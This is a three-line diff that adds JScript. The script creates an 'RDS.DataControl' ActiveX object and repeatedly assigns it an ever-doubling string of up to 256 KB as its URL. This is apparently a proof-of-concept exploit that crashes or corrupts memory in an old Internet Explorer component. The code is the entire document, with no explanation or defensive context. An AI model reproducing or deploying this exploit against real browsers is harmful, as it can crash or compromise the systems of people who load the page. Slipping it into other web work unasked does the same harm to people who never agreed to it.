@@ -1,0 +1,3 @@
+var a = new ActiveXObject(&#039;RDS.DataControl&#039;);
+var b = &quot;X&quot;;
+while (b.length &lt; (1024*256)) a.URL = (b+=b);
